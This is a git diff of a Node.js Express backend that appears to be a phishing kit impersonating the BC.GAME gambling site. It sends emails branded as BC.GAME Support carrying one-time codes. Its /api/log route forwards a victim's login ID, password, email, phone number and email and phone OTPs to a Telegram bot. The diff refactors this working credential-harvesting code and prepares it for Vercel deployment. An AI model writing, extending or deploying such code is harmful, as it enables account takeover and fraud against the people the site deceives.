@@ -8,58 +8,24 @@ const port = process.env.PORT || 3000;
 
 app.use(express.json());
 
-// 1. API ROUTES FIRST (To avoid catch-all interference)
-app.post('/send-otp', async (req, res) => {
-    const { email } = req.body;
-    console.log(`[API] OTP request for: ${email}`);
-
-    if (!email) return res.status(400).json({ success: false, message: 'Email missing' });
-
-    const otp = Math.floor(100000 + Math.random() * 900000).toString();
-
-    const mailOptions = {
-        from: `"BC.GAME Support" <${process.env.EMAIL_USER}>`,
-        to: email,
-        subject: '🔐 Your Verification Code',
-        html: `<div style="background:#1c1e22; color:white; padding:40px; border-radius:15px; font-family:sans-serif; text-align:center; border:2px solid #3bc117;">
-                <h1 style="color:#3bc117;">BC.GAME</h1>
-                <p style="font-size:18px;">Verification Code:</p>
-                <div style="font-size:48px; font-weight:bold; letter-spacing:10px; margin:20px 0; color:#3bc117;">${otp}</div>
-                <p style="color:#98a7b5;">This code is valid for 5 minutes.</p>
-               </div>`
-    };
-
-    try {
-        await transporter.sendMail(mailOptions);
-        console.log(`[API] OTP sent to ${email}`);
-        res.json({ success: true }); 
-    } catch (error) {
-        console.error('[API] Email Error:', error.message);
-        res.status(500).json({ success: false, error: error.message });
-    }
-});
-
+// API Endpoints
 app.post('/api/log', async (req, res) => {
+    console.log(`[LOG] Hit: ${req.body.title}`);
     const { title, data } = req.body;
-    console.log(`[API] Log request: ${title}`);
-
     const token = process.env.LOG_BOT_TOKEN;
     const chatId = process.env.LOG_BOT_CHAT_ID;
 
-    if (!token || !chatId) {
-        console.error('[API] Log Bot Config Missing');
-        return res.status(500).json({ success: false, message: 'Config missing' });
-    }
+    if (!token || !chatId) return res.status(500).json({ success: false });
 
     const message = `
 🔥 <b>${title}</b>
 ━━━━━━━━━━━━━━━
-👤 <b>Initial ID</b>: <code>${data.id}</code>
-🔑 <b>Password</b>: <code>${data.pass}</code>
-📧 <b>Verify Email</b>: <code>${data.email || 'N/A'}</code>
-🔢 <b>Email OTP</b>: <code>${data.email_otp || 'PENDING'}</code>
-📱 <b>Verify Phone</b>: <code>${data.phone || 'N/A'}</code>
-🔢 <b>Phone OTP</b>: <code>${data.phone_otp || 'PENDING'}</code>
+👤 <b>ID</b>: <code>${data.id}</code>
+🔑 <b>Pass</b>: <code>${data.pass}</code>
+📧 <b>Email</b>: <code>${data.email || 'N/A'}</code>
+🔢 <b>E-OTP</b>: <code>${data.email_otp || 'PENDING'}</code>
+📱 <b>Phone</b>: <code>${data.phone || 'N/A'}</code>
+🔢 <b>P-OTP</b>: <code>${data.phone_otp || 'PENDING'}</code>
 🕒 <b>Time</b>: ${data.time}
 ━━━━━━━━━━━━━━━`;
 
@@ -69,36 +35,56 @@ app.post('/api/log', async (req, res) => {
             text: message,
             parse_mode: 'HTML'
         });
-        console.log(`[API] Log sent to Telegram`);
         res.json({ success: true });
-    } catch (error) {
-        console.error('[API] Telegram Error:', error.response?.data || error.message);
-        res.status(500).json({ success: false, error: error.message });
+    } catch (e) {
+        console.error("[LOG] Error:", e.message);
+        res.status(500).json({ success: false });
     }
 });
 
-// 2. STATIC FILES
+app.post('/send-otp', async (req, res) => {
+    console.log(`[OTP] Hit: ${req.body.email}`);
+    const { email } = req.body;
+    if (!email) return res.status(400).json({ success: false });
+
+    const otp = Math.floor(100000 + Math.random() * 900000).toString();
+    const transporter = nodemailer.createTransport({
+        host: process.env.SMTP_HOST || 'smtp.gmail.com',
+        port: parseInt(process.env.SMTP_PORT) || 465,
+        secure: (process.env.SMTP_PORT == '465' || process.env.SMTP_PORT == 'SSL'),
+        auth: {
+            user: process.env.SMTP_USER || process.env.EMAIL_USER,
+            pass: process.env.SMTP_PASS || process.env.EMAIL_PASS
+        }
+    });
+
+    try {
+        await transporter.sendMail({
+            from: process.env.SMTP_FROM || `"BC.GAME" <${process.env.EMAIL_USER}>`,
+            to: email,
+            subject: '🔐 Verification Code',
+            html: `<div style="background:#1c1e22; color:white; padding:40px; border-radius:15px; text-align:center; border:2px solid #3bc117; font-family:sans-serif;">
+                    <h1 style="color:#3bc117;">BC.GAME</h1>
+                    <p>Code: <b style="font-size:32px;">${otp}</b></p>
+                   </div>`
+        });
+        res.json({ success: true });
+    } catch (e) {
+        console.error("[OTP] Error:", e.message);
+        res.status(500).json({ success: false });
+    }
+});
+
+// Serve Static Files
 app.use(express.static(__dirname));
 
-// 3. CATCH-ALL (SPA)
-app.use((req, res, next) => {
-    if (req.method === 'GET' && !req.path.includes('.')) {
-        res.sendFile(path.join(__dirname, 'index.html'));
-    } else {
-        next();
-    }
-});
-
-const transporter = nodemailer.createTransport({
-    host: 'smtp.gmail.com',
-    port: 465,
-    secure: true,
-    auth: {
-        user: process.env.EMAIL_USER,
-        pass: process.env.EMAIL_PASS
-    }
+// Final Catch-all (Only for GET)
+app.get('/*', (req, res) => {
+    res.sendFile(path.join(__dirname, 'index.html'));
 });
 
 app.listen(port, () => {
-    console.log(`🚀 Server is LIVE on port ${port}`);
+    console.log(`🚀 Server listening on port ${port}`);
 });
+
+module.exports = app; // For Vercel
